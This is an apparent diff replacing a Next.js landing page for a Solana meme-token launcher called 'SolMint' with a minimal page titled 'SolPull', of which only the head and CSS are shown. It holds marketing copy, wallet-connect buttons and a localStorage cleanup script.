@@ -1,643 +1,170 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-	<base href="https://mintsolapp.com/" /><meta charset="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
-	<link as="font" crossorigin="" href="/_next/static/media/e4af272ccee01ff0-s.p.woff2" rel="preload" type="font/woff2" />
-	<link data-precedence="next" href="/_next/static/css/f0aa736df958819e.css" rel="stylesheet" />
-	<link data-precedence="next" href="/_next/static/css/12cd491ff0fc8e77.css" rel="stylesheet" />
-	<link data-precedence="next" href="/_next/static/css/34a72a2dfc6ca7d9.css" rel="stylesheet" />
-	<link as="script" fetchpriority="low" href="/_next/static/chunks/webpack-c664b8afda6f4a57.js" rel="preload" /><script src="/_next/static/chunks/4bd1b696-971b53f88719b1a8.js" async=""></script><script src="/_next/static/chunks/1517-3758b8a94985a678.js" async=""></script><script src="/_next/static/chunks/main-app-31f6171ef75306d1.js" async=""></script><script src="/_next/static/chunks/3a91511d-9895b53f9f14bd33.js" async=""></script><script src="/_next/static/chunks/9995-aac1b4a4991d0545.js" async=""></script><script src="/_next/static/chunks/1592-552323d2f4eba5de.js" async=""></script><script src="/_next/static/chunks/5731-ca9949a3963a4766.js" async=""></script><script src="/_next/static/chunks/7146-72604c0bdcde571f.js" async=""></script><script src="/_next/static/chunks/5745-e378c4cff8a1fc6f.js" async=""></script><script src="/_next/static/chunks/app/layout-36b9c31bdf31ce6a.js" async=""></script><script src="/_next/static/chunks/7525-3f03941aa12c5213.js" async=""></script><script src="/_next/static/chunks/1853-337f2655932e8c90.js" async=""></script><script src="/_next/static/chunks/6269-4f39f8b1c12f4286.js" async=""></script><script src="/_next/static/chunks/app/page-bf187f8aba4b98b1.js" async=""></script>
-	<link as="script" fetchpriority="low" href="/_next/static/chunks/163.11b67dcc177b7bd4.js" rel="preload" />
-	<link as="script" fetchpriority="low" href="/_next/static/chunks/3610.39c9c2dcbd5123b9.js" rel="preload" />
-	<link as="script" fetchpriority="low" href="/_next/static/chunks/4645.2b73a6eac0ef208a.js" rel="preload" />
-	<link as="script" fetchpriority="low" href="/_next/static/chunks/7991.d4b0458544731630.js" rel="preload" /><meta name="next-size-adjust"/><meta http-equiv="Cache-Control" content="public, max-age=3600, must-revalidate"/>
-	<link href="https://fonts.googleapis.com" rel="dns-prefetch" />
-	<link crossorigin="anonymous" href="https://fonts.gstatic.com" rel="preconnect" />
-	<link crossorigin="anonymous" href="https://api.cryptapi.io" rel="preconnect" />
-	<title>SolMint - Launch Your Token</title>
-	<meta name="description" content="Create and deploy your Solana meme token effortlessly in seconds. Reach the world and scale without limits!"/><meta name="author" content="SolMint"/><meta name="keywords" content="solana, token, meme, creator, blockchain, crypto, launch"/><meta property="og:title" content="SolMint"/><meta property="og:description" content="Create and deploy your Solana meme token effortlessly in seconds."/><meta property="og:type" content="website"/><meta name="twitter:card" content="summary"/><meta name="twitter:title" content="SolMint"/><meta name="twitter:description" content="Create and deploy your Solana meme token effortlessly in seconds."/>
-	<link href="/favicon.ico" rel="icon" sizes="32x32" type="image/x-icon" />
-	<link href="/favicon.ico" rel="icon" /><script>
-              (function() {
-                // IMMEDIATELY clean up invalid localStorage values
-                // This runs synchronously before React/WalletProvider initializes
-                try {
-                  const adapterKey = '@solana/wallet-adapter-react';
-                  
-                  // ALWAYS remove the key if it's not valid JSON
-                  // This prevents any JSON parse errors
-                  try {
-                    const value = localStorage.getItem(adapterKey);
-                    if (value) {
-                      const trimmed = value.trim();
-                      
-                      // Check if it's NOT valid JSON structure
-                      // Valid JSON must start with {, [, or be a properly quoted string
-                      const isPlainString = !trimmed.startsWith('{') && 
-                                           !trimmed.startsWith('[') && 
-                                           !(trimmed.startsWith('"') && trimmed.endsWith('"') && trimmed.length > 1);
-                      
-                      if (isPlainString) {
-                        // Plain string like "Phantom" - remove immediately (silently)
-                        localStorage.removeItem(adapterKey);
-                      } else {
-                        // Try to parse - if fails or is a string, remove it
-                        try {
-                          const parsed = JSON.parse(value);
-                          // Wallet adapter expects an object, not a string
-                          if (typeof parsed === 'string') {
-                            localStorage.removeItem(adapterKey);
-                          }
-                        } catch (parseError) {
-                          localStorage.removeItem(adapterKey);
-                        }
-                      }
-                    }
-                  } catch (readError) {
-                    // If we can't read, try to remove anyway
-                    try {
-                      localStorage.removeItem(adapterKey);
-                    } catch (removeError) {
-                      // Ignore
-                    }
-                  }
-                } catch (e) {
-                  // Ignore all errors silently
-                }
-              })();
-            </script><script src="/_next/static/chunks/polyfills-42372ed130431b0a.js" nomodule=""></script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SolPull - Meme Coin Launcher</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" />
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Inter', sans-serif;
+      background-color: #111;
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .container {
+      max-width: 500px;
+      width: 100%;
+      background-color: #1a1a1a;
+      border-radius: 20px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+      padding: 40px;
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 28px;
+      margin-bottom: 20px;
+      color: #4caf50;
+    }
+
+    button {
+      background-color: #4caf50;
+      color: white;
+      border: none;
+      padding: 14px 28px;
+      font-size: 16px;
+      border-radius: 12px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+      margin-bottom: 20px;
+    }
+
+    button:hover {
+      background-color: #45a049;
+    }
+
+    p {
+      margin-top: 15px;
+      font-size: 14px;
+      color: #aaa;
+    }
+
+    .footer {
+      margin-top: 30px;
+      font-size: 12px;
+      color: #999;
+    }
+
+    a {
+      color: #4caf50;
+      text-decoration: none;
+    }
+
+    a:hover {
+      text-decoration: underline;
+    }
+
+    .status {
+      margin-top: 15px;
+      font-size: 14px;
+      color: #ccc;
+    }
+  </style>
 </head>
-<body class="__variable_f367f3 font-sans antialiased"><script>
-              (function() {
-                // Clean localStorage IMMEDIATELY when body loads
-                // This is especially important for mobile devices
-                try {
-                  const adapterKey = '@solana/wallet-adapter-react';
-                  const value = localStorage.getItem(adapterKey);
-                  
-                  if (value) {
-                    const trimmed = value.trim();
-                    const isPlainString = !trimmed.startsWith('{') && 
-                                         !trimmed.startsWith('[') && 
-                                         !(trimmed.startsWith('"') && trimmed.endsWith('"') && trimmed.length > 1);
-                    
-                    if (isPlainString) {
-                      localStorage.removeItem(adapterKey);
-                    } else {
-                      try {
-                        const parsed = JSON.parse(value);
-                        if (typeof parsed === 'string') {
-                          localStorage.removeItem(adapterKey);
-                        }
-                      } catch (e) {
-                        localStorage.removeItem(adapterKey);
-                      }
-                    }
-                  }
-                } catch (e) {
-                  // Ignore silently
-                }
-              })();
-            </script>
-<main class="min-h-screen bg-gradient-to-b from-background via-background to-background/90">
-<div class="fixed bottom-4 right-4 sm:bottom-6 sm:right-6 z-40 flex items-center gap-3"><button aria-label="Contact Support" class="w-14 h-14 sm:w-16 sm:h-16 bg-gradient-to-r from-blue-600 to-blue-700 active:from-blue-700 active:to-blue-800 hover:from-blue-700 hover:to-blue-800 text-white rounded-full shadow-lg shadow-blue-500/25 flex items-center justify-center transition-all duration-300 active:scale-95 hover:scale-110 group touch-manipulation" style="-webkit-tap-highlight-color:rgba(59, 130, 246, 0.3);min-width:56px;min-height:56px"><svg class="lucide lucide-message-square w-6 h-6 sm:w-7 sm:h-7 group-hover:scale-110 transition-transform" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path></svg></button></div>
-
-<div class="fixed bottom-4 right-20 sm:bottom-6 sm:right-24 z-40 pointer-events-none opacity-0 hover:opacity-100 transition-opacity hidden sm:block">
-<div class="bg-gray-900 text-white px-4 py-2 rounded-lg shadow-lg text-sm whitespace-nowrap">Support</div>
-</div>
-
-<section class="relative min-h-screen flex items-center justify-center overflow-hidden" style="background-color:var(--color-background);color:var(--color-foreground);width:100%;position:relative">
-<nav class="absolute top-0 left-0 right-0 z-20 p-3 sm:p-4 lg:p-6">
-<div class="container mx-auto flex justify-between items-center">
-<div class="flex items-center space-x-2">
-<div class="w-7 h-7 sm:w-8 sm:h-8 rounded-lg flex items-center justify-center" style="background-color:var(--color-primary)"><svg class="lucide lucide-rocket w-4 h-4 sm:w-5 sm:h-5 text-white" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M4.5 16.5c-1.5 1.26-2 5-2 5s3.74-.5 5-2c.71-.84.7-2.13-.09-2.91a2.18 2.18 0 0 0-2.91-.09z"></path><path d="m12 15-3-3a22 22 0 0 1 2-3.95A12.88 12.88 0 0 1 22 2c0 2.72-.78 7.5-6 11a22.35 22.35 0 0 1-4 2z"></path><path d="M9 12H4s.55-3.03 2-4c1.62-1.08 5 0 5 0"></path><path d="M12 15v5s3.03-.55 4-2c1.08-1.62 0-5 0-5"></path></svg></div>
-<span class="text-lg sm:text-xl font-bold">SolMint</span></div>
-
-<div class="flex items-center gap-2 sm:gap-3 relative z-30"><button class="whitespace-nowrap transition-colors focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring disabled:pointer-events-none disabled:opacity-50 border-input bg-background shadow-sm hover:bg-accent hover:text-accent-foreground p-2 sm:px-3 sm:py-2 text-xs sm:text-sm font-medium rounded-lg sm:rounded-xl border w-10 h-10 sm:w-auto sm:h-auto flex items-center justify-center" style="border-color:hsl(var(--primary) / 0.25);color:var(--color-foreground)"><svg class="lucide lucide-log-in w-4 h-4 sm:w-4 sm:h-4 sm:mr-2" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"></path><polyline points="10 17 15 12 10 7"></polyline><line x1="15" x2="3" y1="12" y2="12"></line></svg><span class="hidden sm:inline">Sign In</span></button><button class="whitespace-nowrap transition-colors focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring disabled:pointer-events-none disabled:opacity-50 bg-primary text-primary-foreground shadow hover:bg-primary/90 p-2 sm:px-3 sm:py-2 text-xs sm:text-sm font-medium rounded-lg sm:rounded-xl w-10 h-10 sm:w-auto sm:h-auto flex items-center justify-center" style="background:linear-gradient(to right, var(--color-primary), var(--color-secondary));color:var(--color-foreground)"><svg class="lucide lucide-user-plus w-4 h-4 sm:w-4 sm:h-4 sm:mr-2" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><line x1="19" x2="19" y1="8" y2="14"></line><line x1="22" x2="16" y1="11" y2="11"></line></svg><span class="hidden sm:inline">Sign Up</span></button></div>
-</div>
-</nav>
-<!--$!--><template data-dgst="BAILOUT_TO_CLIENT_SIDE_RENDERING"></template><!--/$-->
-
-<div class="absolute inset-0 w-full" style="background:linear-gradient(135deg, hsl(var(--primary) / 0.12), hsl(var(--secondary) / 0.12), hsl(var(--accent) / 0.06));left:0;right:0;width:100%">&nbsp;</div>
-
-<div class="absolute inset-0 w-full overflow-hidden" style="left:0;right:0;width:100%">
-<div class="absolute top-10 left-5 sm:top-20 sm:left-20 w-48 h-48 sm:w-72 sm:h-72 rounded-full blur-3xl animate-float opacity-50 sm:opacity-100" style="background-color:hsl(var(--primary) / 0.06);max-width:100%">&nbsp;</div>
-
-<div class="absolute bottom-10 right-5 sm:bottom-20 sm:right-20 w-64 h-64 sm:w-96 sm:h-96 rounded-full blur-3xl animate-float opacity-50 sm:opacity-100" style="background-color:hsl(var(--secondary) / 0.06);animation-delay:-3s;max-width:100%">&nbsp;</div>
-</div>
-
-<div class="relative z-10 container mx-auto px-3 sm:px-4 md:px-6 lg:px-8 text-center w-full max-w-full pt-28 sm:pt-0 pb-20 sm:pb-0">
-<div class="max-w-4xl mx-auto mt-0 sm:mt-16 md:mt-20 lg:mt-24 relative w-full px-2 sm:px-0">
-<div class="absolute top-2 -left-1 sm:-top-8 sm:-left-8 animate-float opacity-50 sm:opacity-40 z-0"><span class="text-2xl sm:text-4xl">🚀</span></div>
-
-<div class="absolute top-4 -right-1 sm:-top-4 sm:-right-8 animate-float-delayed opacity-50 sm:opacity-40 z-0"><span class="text-xl sm:text-3xl">💎</span></div>
-
-<div class="absolute top-20 -left-2 sm:top-20 sm:-left-12 animate-float-slow opacity-40 sm:opacity-30 z-0"><span class="text-xl sm:text-3xl">⚡</span></div>
-
-<div class="absolute top-16 -right-2 sm:top-16 sm:-right-12 animate-float-delayed-slow opacity-40 sm:opacity-30 z-0"><span class="text-xl sm:text-3xl">✨</span></div>
-
-<div class="relative z-10 flex flex-col items-center w-full">
-<div class="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-full max-w-2xl h-32 sm:h-48 pointer-events-none z-0">
-<div class="absolute top-0 left-1/4 w-24 h-24 sm:w-32 sm:h-32 bg-gradient-to-r from-blue-500/20 to-purple-500/20 rounded-full blur-2xl animate-pulse">&nbsp;</div>
-
-<div class="absolute top-0 right-1/4 w-20 h-20 sm:w-28 sm:h-28 bg-gradient-to-r from-purple-500/20 to-pink-500/20 rounded-full blur-2xl animate-pulse" style="animation-delay:1s">&nbsp;</div>
-
-<div class="absolute bottom-0 left-1/2 -translate-x-1/2 w-16 h-16 sm:w-24 sm:h-24 bg-gradient-to-r from-yellow-500/15 to-orange-500/15 rounded-full blur-xl animate-pulse" style="animation-delay:0.5s">&nbsp;</div>
-</div>
-
-<div class="flex items-center justify-center gap-1 sm:gap-2 md:gap-3 lg:gap-4 mb-4 sm:mb-6 px-2 w-full relative z-10">
-<div class="relative flex-shrink-0 hidden sm:block">
-<div class="absolute inset-0 bg-gradient-to-r from-yellow-400/40 to-orange-400/40 rounded-full blur-xl animate-pulse">&nbsp;</div>
-<span class="relative text-2xl sm:text-3xl md:text-4xl lg:text-5xl xl:text-6xl animate-bounce">🌟</span></div>
-
-<h1 class="text-lg sm:text-xl md:text-3xl lg:text-4xl xl:text-5xl 2xl:text-6xl font-bold bg-clip-text text-transparent leading-tight text-center flex-1 min-w-0 relative z-10" style="background-image:linear-gradient(to right, var(--color-foreground), var(--color-primary), var(--color-secondary));text-shadow:0 0 20px rgba(59, 130, 246, 0.3), 0 0 40px rgba(139, 92, 246, 0.2)">Launch your $Solana Token</h1>
-
-<div class="relative flex-shrink-0 hidden sm:block">
-<div class="absolute inset-0 bg-gradient-to-r from-blue-400/40 to-purple-400/40 rounded-full blur-xl animate-pulse">&nbsp;</div>
-<span class="relative text-2xl sm:text-3xl md:text-4xl lg:text-5xl xl:text-6xl animate-bounce" style="animation-delay:0.5s">🚀</span></div>
-</div>
-</div>
-
-<h2 class="text-base sm:text-lg md:text-xl lg:text-2xl xl:text-3xl font-semibold mb-4 sm:mb-6 md:mb-8 px-2 relative z-10" style="color:var(--color-primary);text-shadow:0 0 15px rgba(59, 130, 246, 0.4)">Take it to the Moon!</h2>
-
-<p class="text-sm sm:text-base md:text-lg lg:text-xl mb-6 sm:mb-8 md:mb-12 max-w-2xl mx-auto leading-relaxed px-4" style="color:hsl(var(--foreground) / 0.7)">Create and deploy your Solana coin effortlessly in seconds. Reach the world and scale without limits!</p>
-
-<div class="mb-12 sm:mb-16 flex flex-col sm:flex-row gap-4 items-center justify-center">
-<div class="order-1 sm:order-1"><button class="inline-flex items-center justify-center whitespace-nowrap focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring disabled:pointer-events-none bg-primary hover:bg-primary/90 h-10 text-white px-6 sm:px-8 md:px-12 py-4 sm:py-5 md:py-6 text-base sm:text-lg md:text-xl font-semibold rounded-xl shadow-xl hover:shadow-2xl transition-all duration-300 transform hover:-translate-y-1 disabled:opacity-50 disabled:cursor-not-allowed disabled:transform-none w-full max-w-xs sm:max-w-sm md:min-w-[240px] md:w-auto" style="background:linear-gradient(to right, #666, #888);border-color:var(--color-primary)"><svg class="lucide lucide-rocket w-4 h-4 sm:w-5 sm:h-5 md:w-6 md:h-6 mr-2 sm:mr-3" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M4.5 16.5c-1.5 1.26-2 5-2 5s3.74-.5 5-2c.71-.84.7-2.13-.09-2.91a2.18 2.18 0 0 0-2.91-.09z"></path><path d="m12 15-3-3a22 22 0 0 1 2-3.95A12.88 12.88 0 0 1 22 2c0 2.72-.78 7.5-6 11a22.35 22.35 0 0 1-4 2z"></path><path d="M9 12H4s.55-3.03 2-4c1.62-1.08 5 0 5 0"></path><path d="M12 15v5s3.03-.55 4-2c1.08-1.62 0-5 0-5"></path></svg>Connect Wallet First</button></div>
-</div>
-
-<div class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4 sm:gap-6 md:gap-8 max-w-4xl mx-auto px-4">
-<div class="relative bg-white/5 backdrop-blur-sm rounded-xl p-4 sm:p-6 border border-white/10 hover:bg-white/10 transition-all duration-300 transform hover:-translate-y-2 group">
-<div class="relative w-10 h-10 sm:w-12 sm:h-12 bg-blue-500/20 rounded-lg flex items-center justify-center mx-auto mb-3 sm:mb-4">
-<div class="absolute inset-0 bg-gradient-to-r from-blue-400/30 to-cyan-400/30 rounded-lg blur-lg group-hover:blur-xl transition-all duration-300">&nbsp;</div>
-
-<div class="relative flex items-center gap-2"><span class="text-xl animate-pulse">⚡</span></div>
-</div>
-
-<h3 class="text-base sm:text-lg font-semibold text-white mb-2">Lightning Fast</h3>
-
-<p class="text-gray-400 text-xs sm:text-sm">Launch your token in just a few clicks &mdash; fast, reliable, and hassle-free.</p>
-</div>
-
-<div class="relative bg-white/5 backdrop-blur-sm rounded-xl p-4 sm:p-6 border border-white/10 hover:bg-white/10 transition-all duration-300 transform hover:-translate-y-2 group">
-<div class="relative w-10 h-10 sm:w-12 sm:h-12 bg-purple-500/20 rounded-lg flex items-center justify-center mx-auto mb-3 sm:mb-4">
-<div class="absolute inset-0 bg-gradient-to-r from-purple-400/30 to-pink-400/30 rounded-lg blur-lg group-hover:blur-xl transition-all duration-300">&nbsp;</div>
-
-<div class="relative flex items-center gap-2"><span class="text-xl animate-pulse" style="animation-delay:0.3s">🛡️</span></div>
-</div>
-
-<h3 class="text-base sm:text-lg font-semibold text-white mb-2">Secure &amp; Safe</h3>
-
-<p class="text-gray-400 text-xs sm:text-sm">Security at the highest level with automated security checks.</p>
-</div>
-
-<div class="relative bg-white/5 backdrop-blur-sm rounded-xl p-4 sm:p-6 border border-white/10 hover:bg-white/10 transition-all duration-300 transform hover:-translate-y-2 group sm:col-span-2 md:col-span-1">
-<div class="relative w-10 h-10 sm:w-12 sm:h-12 bg-green-500/20 rounded-lg flex items-center justify-center mx-auto mb-3 sm:mb-4">
-<div class="absolute inset-0 bg-gradient-to-r from-green-400/30 to-emerald-400/30 rounded-lg blur-lg group-hover:blur-xl transition-all duration-300">&nbsp;</div>
-
-<div class="relative flex items-center gap-2"><span class="text-xl animate-pulse" style="animation-delay:0.6s">🚀</span></div>
-</div>
-
-<h3 class="text-base sm:text-lg font-semibold text-white mb-2">No Coding</h3>
-
-<p class="text-gray-400 text-xs sm:text-sm">Create tokens visually &mdash; no programming knowledge required.</p>
-</div>
-</div>
-</div>
-</div>
-
-<div class="absolute bottom-6 sm:bottom-8 left-1/2 transform -translate-x-1/2 animate-bounce z-20">
-<div class="w-5 h-8 sm:w-6 sm:h-10 border-2 border-white/40 sm:border-white/30 rounded-full p-1">
-<div class="w-1 h-2 sm:h-3 bg-white/80 sm:bg-white/60 rounded-full mx-auto animate-pulse">&nbsp;</div>
-</div>
-</div>
-
-<div style="position:absolute;left:-9999px;opacity:0;pointer-events:none">
-<div class="wallet-adapter-dropdown"><button class="wallet-adapter-button wallet-adapter-button-trigger" style="pointer-events:auto" tabindex="0" type="button">Select Wallet</button>
-
-<ul aria-label="dropdown-list" class="wallet-adapter-dropdown-list false" role="menu">
-	<li class="wallet-adapter-dropdown-list-item" role="menuitem">Change wallet</li>
-</ul>
-</div>
-</div>
-</section>
-<!--$--><!--$!--><template data-dgst="BAILOUT_TO_CLIENT_SIDE_RENDERING"></template>
-
-<div class="min-h-[400px] animate-pulse bg-gray-800/50 rounded-lg">&nbsp;</div>
-<!--/$--><!--/$--><!--$--><!--$-->
-
-<section class="py-20 px-4">
-<div class="container mx-auto max-w-6xl">
-<div class="text-center mb-16">
-<h2 class="text-3xl md:text-5xl font-bold mb-6 bg-gradient-to-r from-white to-blue-200 bg-clip-text text-transparent">Why Choose Our Platform?</h2>
-
-<div class="w-24 h-1 bg-gradient-to-r from-blue-500 to-purple-500 mx-auto rounded-full mb-6">&nbsp;</div>
-
-<p class="text-xl text-gray-300 max-w-3xl mx-auto">Powerful Features to Launch Your Token Successfully</p>
-
-<p class="text-gray-400 mt-4 max-w-4xl mx-auto">Our platform provides everything you need to create, deploy, and manage your Solana tokens with confidence and ease.</p>
-</div>
-
-<div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
-<div class="relative group bg-white/5 backdrop-blur-sm rounded-2xl p-8 border border-white/10 hover:bg-white/10 hover:border-white/20 transition-all duration-300 hover:-translate-y-2">
-<div class="mb-6 text-center"><span class="text-4xl animate-pulse group-hover:scale-110 transition-transform duration-300 inline-block" style="animation-delay:0s">⚡🔥</span></div>
-
-<h3 class="text-xl font-bold text-white mb-4 group-hover:text-blue-200 transition-colors text-center">Lightning Fast</h3>
-
-<p class="text-gray-400 leading-relaxed group-hover:text-gray-300 transition-colors text-center">Your tokens are created with the highest security standards. Every transaction is verified and secured on the Solana blockchain.</p>
-
-<div class="absolute inset-0 rounded-2xl bg-gradient-to-r from-blue-500 to-cyan-500 pointer-events-none -z-10 opacity-0 group-hover:opacity-5 transition-opacity duration-300">&nbsp;</div>
-</div>
-
-<div class="relative group bg-white/5 backdrop-blur-sm rounded-2xl p-8 border border-white/10 hover:bg-white/10 hover:border-white/20 transition-all duration-300 hover:-translate-y-2">
-<div class="mb-6 text-center"><span class="text-4xl animate-pulse group-hover:scale-110 transition-transform duration-300 inline-block" style="animation-delay:0.2s">🛡️💎</span></div>
-
-<h3 class="text-xl font-bold text-white mb-4 group-hover:text-blue-200 transition-colors text-center">Secure &amp; Safe</h3>
-
-<p class="text-gray-400 leading-relaxed group-hover:text-gray-300 transition-colors text-center">Create and deploy your token in seconds, not hours. Our optimized process ensures quick and reliable token creation.</p>
-
-<div class="absolute inset-0 rounded-2xl bg-gradient-to-r from-yellow-500 to-orange-500 pointer-events-none -z-10 opacity-0 group-hover:opacity-5 transition-opacity duration-300">&nbsp;</div>
-</div>
-
-<div class="relative group bg-white/5 backdrop-blur-sm rounded-2xl p-8 border border-white/10 hover:bg-white/10 hover:border-white/20 transition-all duration-300 hover:-translate-y-2">
-<div class="mb-6 text-center"><span class="text-4xl animate-pulse group-hover:scale-110 transition-transform duration-300 inline-block" style="animation-delay:0.4s">🚀🎯</span></div>
-
-<h3 class="text-xl font-bold text-white mb-4 group-hover:text-blue-200 transition-colors text-center">No Coding</h3>
-
-<p class="text-gray-400 leading-relaxed group-hover:text-gray-300 transition-colors text-center">No coding required! Our intuitive interface makes token creation accessible to everyone, regardless of technical background.</p>
-
-<div class="absolute inset-0 rounded-2xl bg-gradient-to-r from-green-500 to-emerald-500 pointer-events-none -z-10 opacity-0 group-hover:opacity-5 transition-opacity duration-300">&nbsp;</div>
-</div>
-</div>
-
-<div class="text-center mt-16 relative">
-<div class="bg-gradient-to-r from-blue-600/20 to-purple-600/20 rounded-2xl p-8 border border-blue-500/20 relative overflow-hidden">
-<div class="absolute top-4 left-8 animate-float opacity-50"><span class="text-3xl">🚀</span></div>
-
-<div class="absolute top-8 right-8 animate-float-delayed opacity-50"><span class="text-2xl">✨</span></div>
-
-<div class="absolute bottom-4 left-12 animate-float-slow opacity-40"><span class="text-2xl">💎</span></div>
-
-<div class="absolute bottom-8 right-12 animate-float-delayed-slow opacity-40"><span class="text-2xl">⚡</span></div>
-
-<div class="relative z-10">
-<div class="flex justify-center items-center gap-4 mb-4">
-<div class="relative">
-<div class="absolute inset-0 bg-gradient-to-r from-yellow-400/30 to-orange-400/30 rounded-full blur-xl animate-pulse">&nbsp;</div>
-<span class="relative text-4xl animate-bounce">🌟</span></div>
-
-<h3 class="text-2xl md:text-3xl font-bold text-white">Ready to Launch Your Token?</h3>
-</div>
-
-<p class="text-gray-300 mb-6 max-w-2xl mx-auto">Join thousands of successful projects that have launched on our platform. Start creating your token today!</p>
-<button class="bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700 text-white px-8 py-4 rounded-xl font-semibold shadow-xl hover:shadow-2xl transition-all duration-300 transform hover:-translate-y-1 inline-flex items-center gap-3"><span class="animate-pulse">🚀</span>Create Token Now</button></div>
-</div>
-</div>
-</div>
-</section>
-<!--/$--><!--/$--><!--$--><!--$-->
-
-<section class="py-20 px-4" id="faq">
-<div class="container mx-auto max-w-4xl">
-<div class="text-center mb-16 relative">
-<div class="absolute -top-8 -left-8 animate-float opacity-40"><span class="text-4xl">❓</span></div>
-
-<div class="absolute -top-4 -right-8 animate-float-delayed opacity-40"><span class="text-3xl">💡</span></div>
-
-<div class="absolute top-12 -left-12 animate-float-slow opacity-30"><span class="text-3xl">🤔</span></div>
-
-<div class="absolute top-16 -right-12 animate-float-delayed-slow opacity-30"><span class="text-3xl">✨</span></div>
-
-<div class="relative z-10 flex items-center justify-center gap-4 mb-6">
-<div class="relative">
-<div class="absolute inset-0 bg-gradient-to-r from-blue-400/40 to-purple-400/40 rounded-full blur-lg animate-pulse">&nbsp;</div>
-<span class="relative text-5xl animate-bounce">💭</span></div>
-
-<h2 class="text-3xl md:text-5xl font-bold bg-gradient-to-r from-white to-blue-200 bg-clip-text text-transparent">Frequently Asked Questions</h2>
-
-<div class="relative">
-<div class="absolute inset-0 bg-gradient-to-r from-yellow-400/40 to-orange-400/40 rounded-full blur-lg animate-pulse">&nbsp;</div>
-<span class="relative text-5xl animate-bounce" style="animation-delay:0.5s">❓</span></div>
-</div>
-
-<div class="w-24 h-1 bg-gradient-to-r from-blue-500 to-purple-500 mx-auto rounded-full mb-6">&nbsp;</div>
-
-<p class="text-xl text-gray-300">Find answers to common questions about our platform</p>
-</div>
-
-<div class="space-y-4">
-<div class="relative bg-white/5 backdrop-blur-sm rounded-xl border border-white/10 overflow-hidden hover:border-white/20 transition-all duration-300 hover:shadow-lg hover:shadow-blue-500/10 group transform hover:-translate-y-1" style="animation:fadeInUp 0.6s ease-out 0s both">
-<div class="absolute inset-0 bg-gradient-to-r from-blue-500/5 to-purple-500/5 opacity-0 group-hover:opacity-100 transition-opacity duration-300">&nbsp;</div>
-<button class="relative z-10 w-full px-6 py-6 text-left flex items-center justify-between hover:bg-white/5 transition-all duration-300 group"></button>
-
-<div class="flex items-center gap-3">
-<div class="relative">
-<div class="absolute inset-0 bg-gradient-to-r from-blue-400/30 to-purple-400/30 rounded-full blur-md opacity-0 group-hover:opacity-100 transition-opacity duration-300">&nbsp;</div>
-<button class="relative z-10 w-full px-6 py-6 text-left flex items-center justify-between hover:bg-white/5 transition-all duration-300 group"><span class="relative text-xl animate-pulse" style="animation-delay:0s">🤖</span></button></div>
-<span class="text-white font-semibold text-lg group-hover:text-blue-200 transition-colors duration-300">What is the LunaLaunch?</span></div>
-
-<div class="flex-shrink-0">
-<div class="transform transition-transform duration-300 group-hover:scale-110 rotate-0"><svg class="lucide lucide-chevron-down w-5 h-5 transition-colors duration-300 text-gray-400 group-hover:text-blue-300" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="m6 9 6 6 6-6"></path></svg></div>
-</div>
-
-<div class="overflow-hidden transition-all duration-500 ease-out" style="max-height:0px;opacity:0;transform:translateY(-10px)">
-<div class="px-6 pb-6">
-<div class="border-t border-white/10 pt-4">
-<p class="text-gray-300 leading-relaxed">LunaLaunch is a powerful platform that allows you to create and deploy Solana tokens effortlessly. Our platform provides all the tools you need to launch your token project successfully.</p>
-</div>
-</div>
-</div>
-</div>
-
-<div class="relative bg-white/5 backdrop-blur-sm rounded-xl border border-white/10 overflow-hidden hover:border-white/20 transition-all duration-300 hover:shadow-lg hover:shadow-blue-500/10 group transform hover:-translate-y-1" style="animation:fadeInUp 0.6s ease-out 0.1s both">
-<div class="absolute inset-0 bg-gradient-to-r from-blue-500/5 to-purple-500/5 opacity-0 group-hover:opacity-100 transition-opacity duration-300">&nbsp;</div>
-<button class="relative z-10 w-full px-6 py-6 text-left flex items-center justify-between hover:bg-white/5 transition-all duration-300 group"></button>
-
-<div class="flex items-center gap-3">
-<div class="relative">
